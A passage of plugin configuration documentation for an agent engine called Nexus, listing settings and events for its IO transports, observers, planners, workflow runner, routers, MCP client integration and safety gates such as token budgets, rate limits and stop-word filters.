| `inputs`                 | list     | *(empty)*   | Scripted user inputs (fed sequentially). |
| `input_delay`            | duration | `500ms`     | Delay between inputs. |
| `approval_mode`          | string   | `approve`   | `approve`, `deny`, `per-prompt`. |
| `approval_rules`         | list     | *(empty)*   | Per-prompt rules: each `{match: <substring>, action: <approve|deny>}`. |
| `hitl_responses`         | list     | *(empty)*   | Scripted answers to `hitl.requested` events. Bare strings are treated as `free_text`; `{choice_id: ..., free_text: ...}` maps populate the corresponding response fields. |
| `hitl_auto_respond`      | bool     | `true`      | Whether `hitl.requested` is answered automatically (the next `hitl_responses` entry, else the request's `default_choice_id`, else an empty answer). Set `false` to leave a question genuinely unanswered so something else owns the answer — another transport, or another engine, as in the [A2A loopback](../guides/a2a.md#nexusnexus-loopback). The event is still collected either way. |
| `mock_responses`         | list     | *(empty)*   | Synthetic LLM responses. Each `{content, tool_calls: [{name, arguments}]}`. When set, the plugin vetoes real `llm.request` events. |
| `timeout`                | duration | `60s`       | Session timeout. |
| `read_stdin`             | bool     | `true`      | Read stdin when no other input source is available. |

### `nexus.io.wails`

Source: `plugins/io/wails/plugin.go`. Wails-native transport. The runtime is
installed by the embedder via `Hub().SetRuntime()` before `engine.Boot`; this
plugin only configures event bridging.

| Key         | Type | Default     | Description |
|-------------|------|-------------|-------------|
| `subscribe` | list | *(empty)*   | Event types to bridge bus → frontend. Empty triggers legacy hardcoded chat-event subscriptions for parity with `nexus.io.browser`. |
| `accept`    | list | *(empty)*   | Event types accepted from the frontend → bus. |

### `nexus.io.oneshot`

Source: `plugins/io/oneshot/plugin.go`. Scripting/batch mode with JSON
transcript output.

| Key           | Type   | Default | Description |
|---------------|--------|---------|-------------|
| `input`       | string | *(none)* | Inline prompt (lowest precedence). |
| `input_file`  | string | *(none)* | Path to a prompt file. |
| `output_file` | string | *(none)* | Path to write the JSON transcript. |
| `pretty`      | bool   | `true`  | Pretty-print JSON output. |
| `read_stdin`  | bool   | `true`  | Read stdin when available. |

Prompt resolution precedence: `NEXUS_ONESHOT_PROMPT` env > `input` > `input_file`
> stdin.

### Native Realtime API integration — deferred

OpenAI Realtime and Gemini Multimodal Live are entire new wire protocols
separate from the standard chat/generate endpoints. They are **not**
part of the multimodal-foundation PR (#93) and are tracked as a
follow-up under issue #91. Until they land, voice-mode use the
ASR → LLM → TTS pipeline implemented in `plugins/io/voice/`. See
[Native Realtime API integration — deferred](../multimodal/native-realtime-deferred.md)
for the full rationale and follow-up scope.

---

## Observers

### `nexus.observe.thinking`

Source: `plugins/observe/thinking/plugin.go`. **No configuration.** Marker
plugin: presence in `plugins.active` lets terminal and browser shells
enable thinking-related UI. The events themselves are journaled
automatically and can be read live via `journal.Writer.SubscribeProjection`
or post-mortem via `journal.ProjectFile`.

### `nexus.observe.otel`

Source: `plugins/observe/otel/plugin.go`. OTLP exporter (one root span per
session, one span per event).

| Key             | Type   | Default | Description |
|-----------------|--------|---------|-------------|
| `endpoint`      | string | *(none)* | OTLP endpoint, e.g. `http://localhost:4317`. |
| `protocol`      | string | `grpc`  | `grpc` or `http/protobuf`. |
| `service_name`  | string | `nexus` | OpenTelemetry service name. |
| `exclude_events`| list   | *(empty)* | Event types to skip; supports prefix wildcards (`llm.stream.*`). |

### `nexus.observe.sampler`

Source: `plugins/observe/sampler/plugin.go`. **Off by default.** Captures a
fraction of live session journals (and every failed session when
`failure_capture` is on) into a local directory so the eval pipeline can
score them later. The plugin must be both registered (it is — automatically
via `pkg/engine/allplugins`) **and** listed in `plugins.active` *and*
configured with `enabled: true` for any capture to happen. Omitting the
config block, or setting `enabled: false`, makes the plugin a no-op:
`Subscriptions()` returns empty, no bus traffic, no disk writes.

```yaml
plugins:
  active:
    - nexus.observe.sampler

  nexus.observe.sampler:
    enabled: false
    rate: 0.0
    failure_capture: true
    out_dir: ~/.nexus/eval/samples
```

| Key               | Type    | Default                 | Description |
|-------------------|---------|-------------------------|-------------|
| `enabled`         | bool    | `false`                 | Master switch. When `false`, the plugin draws no bus traffic and writes no files even if it appears in `plugins.active`. |
| `rate`            | float   | `0.0`                   | Fraction of normal sessions captured at `io.session.end`, in `[0, 1]`. `0.0` disables rate sampling; `1.0` captures every session. Validated at `Init`; out-of-range values fail boot when `enabled: true`. |
| `failure_capture` | bool    | `true`                  | When `true`, sessions whose `metadata/session.json` status is anything other than `active` or `completed` are captured **regardless of `rate`**. Use `false` to disable failure capture entirely. |
| `out_dir`         | string  | `~/.nexus/eval/samples` | Directory where samples land. Path expansion via `engine.ExpandPath`. Each sample is written to `<out_dir>/<session-id>/journal/` plus a `<out_dir>/<session-id>/metadata.json` sibling. |

The plugin emits an `eval.candidate` event per capture (payload defined in
`plugins/observe/sampler/events.go`) so downstream tooling — for example,
`nexus eval list-candidates` once it lands — can enumerate fresh samples.

The pluggable `Redactor` interface (`plugins/observe/sampler/redact.go`) is
the hook for future PII scrubbing. v1 ships only the `IdentityRedactor`
(byte-pass-through). Tests inject custom redactors via the package-private
`Plugin.SetRedactor` API; production runs leave it on the default.

> **Caveat: rotated journal segments.** When a non-identity redactor is
> configured, the active `events.jsonl` segment is rewritten line-by-line
> through it. Compressed `*.jsonl.zst` rotated segments are byte-copied
> as-is in v1 — handling them transparently requires zstd round-trips
> that are deferred to a follow-up.

---

## Planners

### `nexus.planner.dynamic`

Source: `plugins/planners/dynamic/plugin.go`.

| Key                 | Type   | Default      | Description |
|---------------------|--------|--------------|-------------|
| `approval`          | string | `auto`       | `always` (block until user approves), `never` (auto-execute), `auto` (LLM decides). |
| `plan_prompt`       | string | *(default)*  | Inline planning prompt. |
| `plan_prompt_file`  | string | *(none)*     | Path to a planning prompt file. |
| `model_role`        | string | *(default)*  | Role used for plan generation. |
| `model`             | string | *(none)*     | Explicit model ID (backward-compat; prefer `model_role`). |
| `max_steps`         | int    | `10`         | Hard cap; excess steps from the LLM are truncated. |

### `nexus.planner.static`

Source: `plugins/planners/static/plugin.go`. Approval auto-defaults to `never`
(static plans don't call an LLM).

| Key                       | Type   | Default                  | Description |
|---------------------------|--------|--------------------------|-------------|
| `approval`                | string | `never`                  | `always` or `never`. |
| `summary`                 | string | `Static execution plan`  | Free-form plan summary. |
| `steps`                   | list   | *(required)*             | Step list. |
| `steps[].description`     | string | *(required)*             | Step description. |
| `steps[].instructions`    | string | *(none)*                 | Step-specific instructions. |

---

## Workflows

### Generic workflow surface

Workflow plugins (currently `nexus.workflows.icm`; planned to extend to other
multi-stage runners) emit a workflow-agnostic event class so IO plugins can
render a dedicated progress surface (a sticky panel in the TUI right rail; a
status indicator chip in the browser) without subscribing to plugin-specific
event taxonomies.

**Event**: `workflow.progress` — payload `events.WorkflowProgress`
(`pkg/events/workflow.go`).

| Field            | Type            | Description |
|------------------|-----------------|-------------|
| `workflow_id`    | string          | Producer plugin instance ID (`nexus.workflows.icm`, `nexus.workflows.icm/script`, …). |
| `workflow_name`  | string          | Human-readable workflow label (workspace name for ICM). |
| `run_id`         | string          | Identifier for this particular run. |
| `stage` / `stage_label` | string   | Machine ID + display label for the current stage. Empty at run start / end. |
| `stage_index` / `stage_total` | int | 1-based position in the stage sequence. |
| `iteration` / `max_iterations` | int | Loop iteration counters. `0` when the stage is not looping. |
| `turn` / `max_turns` | int         | Inner-turn counters. `0` when not tracked. |
| `items_done` / `items_total` | int | Fan-out progress. `0` when not a fan-out stage. |
| `current_item`   | string          | Most recently completed item ID for fan-out. |
| `status`         | string          | One of `started`, `running`, `iterating`, `item_done`, `completed`, `failed`, `halted`. |
| `detail`         | string          | Short free-form one-liner suitable for display. |
| `failures`       | list of strings | Names of predicates whose failure prevented this iteration / turn from converging. |

ICM emits `workflow.progress` *alongside* its detailed `icm.*` events: the
`icm.*` family feeds scrollback audit rows; `workflow.progress` feeds the
dedicated status surface. Future workflow plugins can emit only the generic
event and inherit the same UI treatment without per-plugin subscriptions.

The TUI (`nexus.io.tui`) and browser (`nexus.io.browser`) subscribe to
`workflow.progress` automatically when active.

### `nexus.workflows.icm`

Source: `plugins/workflows/icm/plugin.go`. File-driven multi-stage workflow
runner. A workspace is a folder containing `operator.md`, `workspace.md`, and
a `stages/` tree of contracts; each stage runs as a sub-agent dispatched via
the posture registry. Multi-instance: pin distinct workspaces per instance
via the `nexus.workflows.icm/<suffix>` form (e.g.
`nexus.workflows.icm/script`). See `docs/src/plugins/workflows-icm.md` for
the full plugin guide.

Requires the `posture.registry` capability (provided by
`nexus.agent.postures`). Strongly recommended companions:
`nexus.control.hitl` (human gates + judge approvals), `nexus.skills`
(workspace skills authoring tooling).

| Key                                  | Type   | Default       | Description |
|--------------------------------------|--------|---------------|-------------|
| `workspace`                          | string | *(required)*  | Path to the ICM workspace folder. Expanded via `~`. Loaded + validated at boot; load errors fail boot. |
| `default_judge_posture`              | string | *(empty)*     | Registered posture name used for `type: llm` predicates that do not name an explicit `model:` posture. Required when any predicate uses `type: llm`. |
| `default_workflow_posture`           | string | *(empty)*     | Optional base posture name. Stages without an `agent.posture:` inherit Model / AllowedTools / Budget / MaxRecursionDepth from this posture before applying stage-level overrides. |
| `cache_size`                         | int    | `0`           | Per-run delegate cache capacity. `0` disables caching (recommended — ICM stages typically have tool side effects + predicate retries that make cross-run caching hostile). |
| `inline_artifact_limit_bytes`        | int    | `32768`       | Maximum size for inlining an artifact body into the XML payload. Above this threshold ICM emits `<artifact_ref/>` and the LLM uses `read_file`. |
| `loop_max_restarts`                  | int    | `3`           | Per-stage cap on `loop.on_exhausted: human_gate` `restart` choices. `0` = unlimited. Prevents infinite restart cycles when a workspace cannot converge. |
| `input_filename`                     | string | `input.txt`   | Filename written into `<runID>/00_input/` when `io.input` carries direct content (not a file path). |
| `treat_input_as_path_if_exists`      | bool   | `true`        | When true, `io.input.Content` is interpreted as a file path if `os.Stat` succeeds and the file is copied into `00_input/`; otherwise the content is written verbatim. |
| `workspace_inputs_dir`               | string | *(empty)*     | Optional directory whose regular files are copied into `<runID>/00_input/` at run start, before `io.input` content is processed. Useful for static fixtures. |
| `auto_include_skill_reference_tool`  | bool   | `true`        | When true, ICM automatically appends the `read_skill_reference[_<suffix>]` tool to each derived stage posture whose contract declares `inputs.skills`. Set false to require explicit listing in `agent.tools`. |
| `predicate_command_timeout_seconds`  | int    | `30`          | Default timeout for `type: command` predicates when neither the predicate nor the stage budget specifies one. |
| `emit_progress_thinking_steps`       | bool   | `true`        | When true, ICM emits `thinking.step` events with `Phase="icm.<stage_id>"` so UIs that render thinking surfaces show inline stage transitions. |

#### Events

Subscribes:

- `io.input` — entry point. Each input begins a new workflow run.
- `hitl.responded` — resumes a run paused at a human gate or `type: human` predicate.

Emits (workflow lifecycle):

- `icm.run.started` / `icm.run.completed` / `icm.run.halted` — overall run boundaries.
- `icm.stage.started` / `icm.stage.completed` / `icm.stage.failed` — per-stage transitions.
- `icm.stage.iteration` — fires once per loop iteration with the prior iteration's `exit_failures`.
- `icm.turn` — fires once per inner turn with the turn's validator failures.
- `icm.fanout.item` — per-item lifecycle in a fan-out stage (`active`, `completed`, `failed`).
- `icm.predicate.failed` — fires for every predicate evaluation whose verdict is `fail`.
- `plan.created` / `plan.progress` — generic plan surface mirrored for any UI that already renders ReAct plans.
- `workflow.progress` — engine-generic structured progress (see [Generic workflow surface](#generic-workflow-surface) below).
- `hitl.requested` — human gates and `type: human` predicates dispatch through HITL.

### `nexus.skills`

Source: `plugins/skills/plugin.go`. Registers the `activate_skill` LLM tool.

| Key                        | Type | Default | Description |
|----------------------------|------|---------|-------------|
| `scan_paths`               | list | *(empty)* | Directories scanned for `SKILL.md` files. **No implicit defaults — discovery is gated entirely by this list.** |
| `trust_project`            | string | `ask` | Trust level for project skills: `ask`, `always`, `never`. |
| `max_active_skills`        | int    | `10`  | Hard cap on concurrently active skills. |
| `catalog_in_system_prompt` | bool   | `true`| Inject the skill catalog into the system prompt at priority 50. |
| `disabled_skills`          | list   | *(empty)* | Skill names to disable even if discovered. |

---

## System

### `nexus.system.dynvars`

Source: `plugins/system/dynvars/plugin.go`. Registers a system-prompt section at
priority 100 that lists runtime variables. Each flag defaults to `false` —
opt-in only.

| Key           | Type | Default | Description |
|---------------|------|---------|-------------|
| `date`        | bool | `false` | Include `Current date: YYYY-MM-DD`. |
| `time`        | bool | `false` | Include `Current time: HH:MM:SS`. |
| `timezone`    | bool | `false` | Include the local timezone abbreviation. |
| `cwd`         | bool | `false` | Include the engine working directory. |
| `session_dir` | bool | `false` | Include the session workspace root. |
| `os`          | bool | `false` | Include `os/arch`. |

---

## Control

### `nexus.control.cancel`

Source: `plugins/control/cancel/plugin.go`. **No configuration.** Provides the
`control.cancel` capability used by ReAct and other agents to interrupt
in-flight work; also handles the `/resume` slash command via `io.input` at
priority 5 (ahead of memory plugins).

---

## Routers

Plugins that subscribe `before:llm.request` and rewrite `request.Model`
based on the request's metadata, tags, or an LLM-classifier judgment.
Routers run at priority 50 (metadata) / 45 (classifier) — above gates,
below the engine's tag seeder. Both stand down when the request already
carries `_target_provider` (a fallback retry) or `_routed_by` (an upstream
rule already chose a model).

### `nexus.router.metadata`

Source: `plugins/router/metadata/plugin.go`. Declarative rules over the
request's `Metadata` (`_source`, `task_kind`, `iteration`) and `Tags`
(`tenant`, `project`, `source_plugin`, ...). First matching rule wins;
the terminal `default_model` / `default_role` fires when no rule matches.

| Key             | Type   | Default     | Description |
|-----------------|--------|-------------|-------------|
| `rules`         | list   | *(empty)*   | Ordered rule list. See below. |
| `default_model` | string | *(none)*    | Fallback model id when no rule matches. |
| `default_role`  | string | *(none)*    | Fallback role when no rule matches. |

Each entry under `rules`:

| Key      | Type   | Default     | Description |
|----------|--------|-------------|-------------|
| `name`   | string | `rule#N`    | Optional label recorded on `req.Metadata["_routed_rule"]`. |
| `match`  | map    | *(required)* | Match conditions. Keys: `metadata.<key>`, `tags.<key>`, `role`, `model`. Values: bare string (equality), or `{lt|lte|gt|gte|eq: N}` for numeric comparators on metadata fields. |
| `use`    | string | *(one of)*  | Concrete model id to assign. |
| `role`   | string | *(one of)*  | Role name to assign (resolved against `core.models`). |

### `nexus.router.classifier`

Source: `plugins/router/classifier/plugin.go`. Small LLM judges the
difficulty of the user's most recent prompt and picks one of
`candidate_roles`. The decision is cached by prompt-prefix hash (LRU).
Cache hits rewrite `LLMRequest.Role` synchronously; misses route to
`fallback_role` immediately and warm the cache asynchronously via a
probe `llm.request` tagged `_source: nexus.router.classifier`.

| Key                    | Type   | Default      | Description |
|------------------------|--------|--------------|-------------|
| `classifier_role`      | string | *(required)* | Model role (resolved via `core.models`) used for the classification probe. |
| `candidate_roles`      | list   | *(required)* | Cheapest-first list of model roles the classifier picks among. |
| `fallback_role`        | string | *(none)*     | Model role used on cache miss while the cache warms. |
| `prompt`               | string | *(default)*  | Classifier prompt template (`%s` for the candidate-role list and prompt). |
| `prefix_chars`         | int    | `256`        | Number of leading prompt characters folded into the cache key. |
| `cache_classification` | bool   | `true`       | Whether to cache decisions at all. |
| `cache_max_entries`    | int    | `1024`       | LRU capacity. |
| `latency_budget_ms`    | int    | `800`        | Drop the warm if the probe doesn't return within this window. |

---

## Discovery

### `nexus.discovery.progressive`

Source: `plugins/discovery/progressive/plugin.go`. Hierarchical tool discovery
— the LLM sees class-level summaries and drills into specific classes via a
`discover` meta-tool. Intercepts `before:llm.request` (priority 8) and
`tool.invoke` (priority 40).

| Key                  | Type   | Default     | Description |
|----------------------|--------|-------------|-------------|
| `scope`              | string | `session`   | `session`, `turn`, or `hybrid`. |
| `idle_prune_turns`   | int    | `5`         | Turns of inactivity before a class is pruned (`scope: hybrid` only). |
| `classless_behavior` | string | `include`   | `include` (always reveal classless tools) or `exclude`. |
| `always_include`     | list   | *(empty)*   | Class names that are always fully revealed. |
| `default_depth`      | string | `class`     | `class` (summaries only) or `full` (all tools). |

---

## LLM batch

### `nexus.llm.batch`

Source: `plugins/llm/batch/plugin.go`. Cross-provider batch coordinator
(Anthropic Messages Batches, OpenAI Batch API). Subscribes
`llm.batch.submit`; emits `llm.batch.status` and `llm.batch.results`.

| Key                              | Type     | Default            | Description |
|----------------------------------|----------|--------------------|-------------|
| `poll_interval`                  | duration | `5m`               | How often to poll provider batch status. |
| `data_dir`                       | string   | `~/.nexus/batches` | Directory for persisted batch state (resumed across restarts). |
| `default_max_tokens`             | int      | `1024`             | Default `max_tokens` applied when a batched request didn't pin one. |
| `providers.anthropic.api_key`    | string   | *(env)*            | Anthropic API key. |
| `providers.anthropic.api_key_env`| string   | `ANTHROPIC_API_KEY`| Env var to read the Anthropic key from. |
| `providers.openai.api_key`       | string   | *(env)*            | OpenAI API key. |
| `providers.openai.api_key_env`   | string   | `OPENAI_API_KEY`   | Env var to read the OpenAI key from. |
| `anthropic_api_key_env`          | string   | *(none)*           | Backward-compat: flat top-level Anthropic key env var. |
| `openai_api_key_env`             | string   | *(none)*           | Backward-compat: flat top-level OpenAI key env var. |

v1 limitations (intentional): direct-API auth only (no Bedrock/Vertex/Azure);
text-only requests (no multimodal/thinking/caching/citations); single-provider
per submit; no cancellation API.

---

## MCP integration

### `nexus.mcp.client`

Source: `plugins/mcp/client/`. Bridges one or more external Model Context
Protocol (MCP) servers into Nexus. Tools land in the catalog under
`mcp__<server>__<tool>`, static resources auto-register as no-arg tools,
resource templates become parameterised tools, and prompts surface as slash
commands. See `docs/src/plugins/mcp-client.md` for the user-facing guide.

**Schema-validated at boot.** The plugin ships `plugins/mcp/client/schema.json`
and implements `ConfigSchema()`, so the engine validates this block **before
`Init` runs**, with `additionalProperties: false` at every object level. The
tables below are the whole surface: any key not listed is rejected by name. The
per-transport requirements (`command` for `stdio`, `url` for `http`, `server`
for `inprocess`) are conditional `if`/`then` branches in the schema, so a
missing key aborts the boot naming the key instead of surfacing later as a
connection-phase error from `parseServer`.

Two constraints the schema deliberately does **not** carry: duplicate `name`
values across `servers[]` (a cross-item check JSON Schema cannot express —
`parseConfig` rejects them at parse time), and cross-transport key exclusivity
(`command`, `url` and `server` are read unconditionally, so a leftover `command`
on an `http` server is accepted and ignored, exactly as today).

Top-level keys:

| Key        | Type   | Default | Description |
|------------|--------|---------|-------------|
| `servers`  | list   | *(none)* | One entry per MCP server. See per-server keys below. |
| `defaults` | map    | *(none)* | Inherited by every entry in `servers` unless overridden inline. |
| `aliases`  | map<string,string> | *(none)* | Optional alias map: short slash command → `<server>.<prompt>`. Values must be non-empty strings. Aliases use the configured `command_prefix` chain; e.g. `review: gh.review_pr` makes `/review` rewrite to `/mcp.gh.review_pr`. |

#### `defaults`

| Key                                | Type     | Default | Description |
|------------------------------------|----------|---------|-------------|
| `lifecycle`                        | string   | `engine` | When servers connect/disconnect. `engine` = connect on engine boot, disconnect on shutdown. `session` = connect on `io.session.start`, disconnect on `io.session.end`. Only those two values. |
| `timeout`                          | duration string | `30s` | Per-RPC timeout used for `tools/call`, `resources/read`, `prompts/get`, etc. Must be a **quoted-or-bare duration string** (`30s`, `1m30s`). A bare number is rejected at boot: the parser reads this key only through a `string` type assertion, so `timeout: 30` would silently fall back to the default. |
| `command_prefix`                   | string   | `mcp`   | First segment of the slash command Nexus registers per prompt. With the default a server named `fake` and a prompt named `greet` becomes `/mcp.fake.greet`. Must be non-empty. |
| `resources.enabled`                | bool     | `true`  | Toggle the entire resource surface for the server. |
| `resources.auto_register_static`   | bool     | `true`  | When true, every static resource becomes a no-arg catalog tool. |
| `resources.auto_register_template` | bool     | `true`  | When true, every resource template becomes a catalog tool whose inputSchema mirrors the template's variables. |
| `resources.auto_register_max`      | int ≥ 0  | `50`    | If a server returns more static resources than this, the static auto-registration is skipped and only the generic `list_resources`/`read_resource` tools are exposed. Unlike `timeout`, this one *is* a number — the parser reads it through an int/int64/float64 coercion. Negative values are rejected at boot (the parser would silently ignore them). |
| `resources.subscribe_updates`      | bool     | `true`  | Subscribe to `resources/updated` for each auto-registered static. Notifications produce `mcp.resource.updated` events. |
| `prompts.enabled`                  | bool     | `true`  | Toggle the prompt slash-command surface for the server. |

#### `servers[]`

| Key                | Type     | Default                       | Description |
|--------------------|----------|-------------------------------|-------------|
| `name`             | string   | *(required)*                  | Lowercase alpha-numeric identifier used to namespace every catalog entry and slash command (`[a-z0-9][a-z0-9_-]*`). |
| `transport`        | string   | `stdio`                       | One of `stdio` (subprocess via the SDK), `http` (streamable HTTP), or `inprocess` (in-memory transport to a host-registered `*mcp.Server`). |
| `command`          | string   | *(required for stdio)*        | Executable to launch. Resolved on `PATH`; users wanting `~` expansion can write the full path. |
| `args`             | list<string> | *(none)*                  | Argument list passed to `command`. |
| `env`              | map<string,string> | *(none)*            | Environment variables exported to the subprocess. `${VAR}` references are expanded from the host environment. |
| `env_passthrough`  | list<string> | *(none)*                  | Names of host environment variables forwarded verbatim (skipped silently when not set on the host). |
| `url`              | string   | *(required for http)*         | Base URL of the streamable HTTP MCP endpoint. |
| `headers`          | map<string,string> | *(none)*            | HTTP headers attached to every request. `${VAR}` references expand from the host environment. |
| `server`           | string   | *(required for inprocess)*    | Opaque host-chosen key of a live `*mcp.Server` the embedding host registered with `client.RegisterInProcessServer(key, srv)` **before** `engine.Boot()`. Must be byte-identical to that key. The connection is wired over an in-memory transport instead of a subprocess or HTTP dial. The registry is **process-wide** — see the note below. |
| `lifecycle`        | string   | inherited from `defaults`     | `engine` or `session`. |
| `timeout`          | duration string | inherited from `defaults` | Overrides defaults per server. String only — see `defaults.timeout`. |
| `tools.allow`      | list<string> | *(none)* (all allowed)    | If set, only listed raw MCP tool names are forwarded to the catalog. |
| `tools.deny`       | list<string> | *(none)*                  | Raw MCP tool names to drop unconditionally. Deny takes precedence over allow. |
| `resources.*`      | map      | inherited from `defaults`     | Same keys as `defaults.resources`. |
| `prompts.enabled`  | bool     | inherited from `defaults`     | Disable per server when desired. |

#### `transport: inprocess` — process-wide key namespace

The registry behind `server` (`RegisterInProcessServer` / `UnregisterInProcessServer`
in `plugins/mcp/client/injected.go`) is a **package-level map shared by the whole
process**, not scoped to an engine, agent, or session. A second registration under
an existing key silently replaces the first.

In a host running several engines in one process this is a cross-tenant leak: if
tenant A and tenant B both register under `host-tools`, the map holds whichever
registered last, and tenant A's config — still saying `server: host-tools` —
connects to **tenant B's** MCP server. Nothing errors; the tools answer normally
against the wrong tenant's data. Scope keys per tenant or per agent, and derive
the YAML `server:` value from the same identifier used for the registration key.

The key is resolved when the server connects (during `Boot` for
`lifecycle: engine`, at `io.session.start` for `lifecycle: session`), so
registration must happen before `engine.Boot()`. A *missing* `server` key fails
schema validation at boot; a *present but unregistered* key does not — boot
succeeds and the connect fails with `no host-injected server registered under
key "…"` logged at error, leaving the `mcp__<server>__*` namespace absent.

Full wiring walkthrough with a runnable Go example:
[MCP client → In-process servers](../plugins/mcp-client.md#in-process-servers).

#### Events

Subscribes:

- `tool.invoke` — dispatches MCP tool calls for any registered `mcp__<server>__*` name.
- `before:io.input` — intercepts slash commands; vetoes the original input, then re-emits a fresh `io.input` whose `PreloadMessages` carry the expanded prompt.
- `io.session.start` / `io.session.end` — drive `lifecycle: session` connections.
- `mcp.prompts.list` — synchronous query that fills `events.MCPPromptsList.Prompts` so IO plugins can render `/help`-style listings.

Emits:

- `tool.register`, `tool.result`, `before:tool.result` — the catalog projection.
- `io.input` — replacement input carrying `PreloadMessages` after a prompt expansion.
- `io.output` — system-role error messages when a slash command fails to parse or dispatch.
- `mcp.resource.updated` — fired when a subscribed static resource changes.
- `mcp.tools.refreshed`, `mcp.prompts.refreshed` — bookkeeping events emitted after each per-server reconcile.

Deferred for phase 2 (see issue #98):

- MCP sampling (server-initiated LLM calls).
- OAuth dynamic client registration for the HTTP transport.
- SSE legacy transport.
- Roots beyond the session files directory.

---

## Apps

### `nexus.app.helloworld`

Source: `plugins/apps/helloworld/plugin.go`. Built-in placeholder agent /
proof-of-concept for the bus-bridge pattern.

| Key        | Type   | Default | Description |
|------------|--------|---------|-------------|
| `greeting` | string | `Hello` | Greeting prefix used when responding to `hello.request` events. |

---

## Gates

Gates are vetoable handlers that subscribe to `before:*` events and may block
or transform them. See [`.claude/docs/gates.md`](../../../.claude/docs/gates.md)
for the underlying veto mechanics.

### Pipeline ordering on `before:*` events

Handlers on a `before:*` event run in ascending `Priority` (lower runs first);
dispatch breaks at the first veto. Handlers that share a priority fall back
to **subscription order** — the first `Subscribe` call runs first, and the
bus uses a stable sort so this tiebreak is deterministic across rebuilds
and reorders of `plugins.active`. The engine logs one `WARN` at boot for
every `(before:*, priority)` tuple shared by two or more handlers — re-space
the priorities or accept the registration-order tiebreak knowingly.

The shipped gates encode an explicit policy in their priorities so safety
outcomes don't depend on activation order. The values below are the
authoritative pipeline; treat them as a contract when adding a new gate.

`before:io.output` — mutate-then-veto pipeline:

| Priority | Gate | Role |
|---|---|---|
| 8 | `nexus.gate.content_safety` | Redact (mutate) first, or veto if `action=block` |
| 9 | `nexus.gate.json_schema` | Validate / retry on post-redaction content; may mutate |
| 10 | `nexus.gate.stop_words` | Final ban check on the content that will ship |
| 12 | `nexus.gate.output_length` | Truncate-retry mutation last |

`before:llm.request` — cheap-structural → mutators → input-scanners → HITL:

| Priority | Gate | Role |
|---|---|---|
| 6 | `nexus.gate.endless_loop` | Iteration counter; structural exit |
| 7 | `nexus.gate.token_budget` | Budget reservation; structural |
| 8 | `nexus.tool.discovery.progressive` | Mutates tool list (drill-down) |
| 9 | `nexus.gate.rate_limiter` | Pause until quota available |
| 10 | `nexus.gate.tool_filter` | Mutates tool list (allow/block) |
| 11 | `nexus.gate.prompt_injection` | Pattern-scan input |
| 12 | `nexus.gate.stop_words` | Pattern-scan input |
| 13 | `nexus.gate.approval_policy` | May trigger HITL — most expensive |
| 15 | `nexus.gate.context_window` | Compaction trigger |

### `nexus.gate.endless_loop`

Source: `plugins/gates/endless_loop/plugin.go`.

| Key              | Type | Default | Description |
|------------------|------|---------|-------------|
| `max_iterations` | int  | `25`    | Maximum LLM calls per turn (gate-/planner-sourced calls excluded). |
| `warning_at`     | int  | `0`     | Emit a warning when this count is reached (`0` disables). |

### `nexus.gate.stop_words`

Source: `plugins/gates/stop_words/plugin.go`. Gates both `before:llm.request`
(user messages) and `before:io.output`.

| Key              | Type | Default                                          | Description |
|------------------|------|--------------------------------------------------|-------------|
| `words`          | list | *(empty)*                                        | Inline banned words. |
| `word_files`     | list | *(empty)*                                        | Files of newline-separated words. |
| `case_sensitive` | bool | `false`                                          | Case-sensitive matching. |
| `message`        | string | `Content blocked: contains prohibited terms.`  | Veto message. |

### `nexus.gate.token_budget`

Source: `plugins/gates/token_budget/plugin.go`. Multi-dimensional ceilings
(session / tenant / source_plugin) with `block`, `warn`, or `downgrade-model`
actions. The legacy single-ceiling shape (`max_tokens`) still works as a
session total-token ceiling.

| Key                    | Type   | Default                                     | Description |
|------------------------|--------|---------------------------------------------|-------------|
| `max_tokens`           | int    | *(unset)*                                   | Backward-compat session total-token ceiling. |
| `message`              | string | `Token budget exhausted for this session.`  | Default veto message for the legacy ceiling. |
| `on_exceed`            | string | `block`                                     | Default action when a ceiling fires (`block` \| `warn` \| `downgrade-model`). Each ceiling can override. |
| `downgrade_candidates` | list   | *(empty)*                                   | Model IDs the `downgrade-model` action picks the cheapest entry from (priced via `pkg/engine/pricing`). |
| `pricing`              | map    | *(merged provider defaults)*                | Per-model overrides applied to the unified pricing table; same shape as the per-provider `pricing` block. |
| `estimate_factor`      | float  | `1.5`                                       | Multiplier on the prompt-length token estimate the gate deducts upfront at `before:llm.request` (reserve/commit). Tightens the TOCTOU window under concurrent fan-out by booking estimated headroom before any in-flight request returns; the response handler then subtracts the reservation and adds the actual usage so the net effect is exactly the realized spend. Increase to err on the side of overshoot-prevention; decrease to tolerate more in-flight headroom. |
| `ceilings`             | list   | *(empty)*                                   | List of ceiling rules. See below. |

Each entry under `ceilings`:

| Key                 | Type   | Default     | Description |
|---------------------|--------|-------------|-------------|
| `dimension`         | string | `session`   | One of `session`, `tenant`, `source_plugin`. |
| `match`             | string | *(none)*    | For `tenant`/`source_plugin`: only this bucket. |
| `window`            | string | `session`   | `session` (lifetime of the session) or `day` (rolling UTC midnight). |
| `on_exceed`         | string | top-level default | Per-rule override for the gate's `on_exceed`. |
| `max_input_tokens`  | int    | *(unset)*   | Veto/downgrade once cumulative input tokens reach this value. |
| `max_output_tokens` | int    | *(unset)*   | Same for completion tokens. |
| `max_total_tokens`  | int    | *(unset)*   | Same for total tokens. |
| `max_usd`           | float  | *(unset)*   | Same for USD spend. |
| `max_usd_per_session` | float | *(unset)*  | Convenience alias for `max_usd` with `window: session`. |
| `max_usd_per_day`   | float  | *(unset)*   | Convenience alias for `max_usd` with `window: day`. |
| `message`           | string | *(reason)*  | Override message emitted on `block`/`warn`. |

Tenant ceilings persist via app-scope SQLite (`~/.nexus/plugins/nexus.gate.token_budget/store.db`). Other dimensions are in-memory per session.

### `nexus.gate.rate_limiter`

Source: `plugins/gates/rate_limiter/plugin.go`. Vetoes `before:llm.request`
when the per-window budget is exhausted; the agent's `gate.llm.retry`
subscriber re-issues the request after the limiter signals the budget has
freed up. The pre-Phase-3 `time.Sleep` behavior was removed in alpha — there
is no compat shim.

| Key                   | Type    | Default                                                     | Description |
|-----------------------|---------|-------------------------------------------------------------|-------------|
| `mode`                | string  | `reject`                                                    | `reject` (veto, schedule a single one-shot retry once the window ages out) or `queue` (buffer up to `queue.max_pending` retry slots; a drainer goroutine emits `gate.llm.retry` at the configured rate; excess is rejected outright). |
| `requests_per_minute` | int     | `60`                                                        | Requests allowed per `window_seconds`. |
| `window_seconds`      | int     | `60`                                                        | Sliding window length. |
| `pause_message`       | string  | `Rate limit reached. Pausing for {seconds}s...`             | Output template; `{seconds}` is interpolated. |
